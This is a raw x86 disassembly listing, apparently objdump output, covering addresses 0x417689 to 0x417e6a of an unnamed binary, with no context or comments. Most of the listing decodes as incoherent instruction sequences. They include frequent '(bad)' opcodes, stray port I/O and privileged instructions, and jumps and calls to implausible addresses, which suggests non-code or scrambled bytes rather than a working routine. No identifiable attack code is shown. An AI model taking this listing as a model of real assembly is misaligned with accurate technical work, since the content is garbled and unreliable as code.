  417689:	stos   BYTE PTR es:[edi],al
  41768a:	mov    eax,ds:0x28c542ce
  41768f:	jg     0x41767f
  417691:	and    dl,dl
  417693:	out    0x5e,eax
  417695:	push   ecx
  417696:	push   edi
  417697:	aaa    
  417698:	test   DWORD PTR [ecx],ebx
  41769a:	int3   
  41769b:	mov    eax,ds:0xafb68b86
  4176a0:	mov    al,0xc4
  4176a2:	sub    ebx,ebp
  4176a4:	and    eax,0x65e1f187
  4176a9:	fs jmp 0x7e277fc1
  4176af:	ins    BYTE PTR es:[edi],dx
  4176b0:	js     0x41768b
  4176b2:	pop    esp
  4176b3:	shl    BYTE PTR [esi+0x13],1
  4176b6:	shl    DWORD PTR [eax-0x58207e7d],0x30
  4176bd:	rcr    BYTE PTR [eax],1
  4176bf:	(bad)  
  4176c0:	push   edi
  4176c2:	mov    al,0x14
  4176c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c5:	pop    esi
  4176c6:	add    edi,esp
  4176c8:	aas    
  4176c9:	pop    edi
  4176ca:	push   esp
  4176cb:	clc    
  4176cc:	mov    BYTE PTR [eax+0x16],al
  4176cf:	popa   
  4176d0:	mov    dl,0x4d
  4176d2:	lods   al,BYTE PTR ds:[esi]
  4176d3:	aad    0xd3
  4176d5:	repnz dec esp
  4176d7:	mov    DWORD PTR [ecx],eax
  4176d9:	or     ebp,DWORD PTR [ebx+0x49e83c6b]
  4176df:	pushf  
  4176e0:	aaa    
  4176e1:	cwde   
  4176e2:	mov    DWORD PTR [esi],edx
  4176e4:	add    DWORD PTR [edx],0x2ea32935
  4176ea:	js     0x41772c
  4176ec:	mov    ds,ebp
  4176ee:	das    
  4176ef:	icebp  
  4176f0:	mov    bh,0xef
  4176f2:	pusha  
  4176f3:	test   eax,0x3a255653
  4176f8:	jle    0x4176e2
  4176fa:	mov    edx,0xb5920e6a
  4176ff:	je     0x417761
  417701:	or     al,0x78
  417703:	mov    BYTE PTR [esi+eiz*4],dl
  417706:	sbb    DWORD PTR [esp+esi*1-0x6cd847f5],edx
  41770d:	mov    edx,0x8420623e
  417712:	dec    ebx
  417713:	xchg   ebp,eax
  417714:	fwait
  417715:	push   ds
  417716:	mov    al,ds:0x7b9fa428
  41771b:	adc    eax,0xb3cd8b9
  417720:	fwait
  417721:	sub    bl,dh
  417723:	add    DWORD PTR [ebp+0x665cb35a],esp
  417729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41772a:	call   0xa1d56db3
  41772f:	jno    0x417789
  417731:	ds int 0xb4
  417734:	rcl    DWORD PTR [esi+0x4a],0x9e
  417738:	sbb    eax,0xae6856f1
  41773d:	jl     0x41774c
  41773f:	popf   
  417740:	lahf   
  417741:	pop    esp
  417742:	shr    edi,1
  417744:	ret    0xef2
  417747:	out    0x64,eax
  417749:	push   0xffffff8c
  41774b:	std    
  41774c:	inc    ebp
  41774d:	push   es
  41774e:	adc    DWORD PTR [eax+edx*2+0x1fe1d24b],edx
  417755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417756:	retf   0x7854
  417759:	in     al,dx
  41775a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41775b:	stos   DWORD PTR es:[edi],eax
  41775c:	adc    eax,0x912d0578
  417761:	xchg   DWORD PTR [ecx-0x5d1ba6e0],ecx
  417767:	ins    DWORD PTR es:[edi],dx
  417768:	jg     0x41778b
  41776a:	add    BYTE PTR [ecx+0x1bf95cfa],bh
  417770:	dec    edx
  417771:	fwait
  417772:	dec    esi
  417773:	pop    edi
  417774:	retf   0x192d
  417777:	test   DWORD PTR [ebp-0x1c2f74e4],ebx
  41777d:	(bad)  
  41777e:	mov    ah,0xd7
  417780:	imul   esi,DWORD PTR [edi+ebx*8-0x32],0x6e
  417785:	sub    eax,0x7b8945f0
  41778a:	push   esp
  41778b:	mov    DWORD PTR [ecx-0x743ab079],edi
  417791:	adc    eax,0x7bafe546
  417796:	sbb    BYTE PTR [ecx+0x686ca253],cl
  41779c:	leave  
  41779d:	fsubrp st(3),st
  41779f:	pushf  
  4177a0:	retf   
  4177a1:	aad    0x61
  4177a3:	test   DWORD PTR [edi-0x2b],eax
  4177a6:	jecxz  0x41779a
  4177a8:	sbb    al,0x38
  4177aa:	lea    edi,[edi+0x27]
  4177ad:	inc    ecx
  4177ae:	jno    0x41782b
  4177b0:	shr    DWORD PTR [ecx-0x54],0x14
  4177b4:	repnz add bh,BYTE PTR cs:[esi-0x29]
  4177b9:	jge    0x4177bb
  4177bb:	mov    edx,0x84231a97
  4177c0:	ins    DWORD PTR es:[edi],dx
  4177c1:	aaa    
  4177c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177c3:	in     eax,dx
  4177c4:	(bad)  
  4177c5:	fbstp  TBYTE PTR [ebx+0x7fca4461]
  4177cb:	sbb    ecx,edi
  4177cd:	pop    ebx
  4177ce:	sub    ebp,esp
  4177d0:	or     esi,DWORD PTR [esi]
  4177d2:	mov    BYTE PTR [eax+0x1a],cl
  4177d5:	pop    ebp
  4177d6:	ror    DWORD PTR [esi+edi*4+0x37fba87e],1
  4177dd:	mov    ch,0xac
  4177df:	test   al,0xd8
  4177e1:	out    0x80,eax
  4177e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177e4:	or     al,0x1c
  4177e6:	and    ebp,DWORD PTR [eax+0x1dd53f1b]
  4177ec:	sub    DWORD PTR [edi],0x8cb34e15
  4177f2:	in     al,dx
  4177f3:	retf   0x1391
  4177f6:	test   BYTE PTR [esi+0x5e],cl
  4177f9:	cmp    BYTE PTR [edi+0x68b83a77],cl
  4177ff:	rol    BYTE PTR [esi+0x65],cl
  417802:	iret   
  417803:	xor    DWORD PTR [bx+0xa],ebx
  417807:	cmp    ecx,DWORD PTR [edx+eiz*1+0x18]
  41780b:	in     al,0x30
  41780d:	adc    eax,0xf16dea2e
  417812:	int3   
  417813:	(bad)  
  417814:	jle    0x417874
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
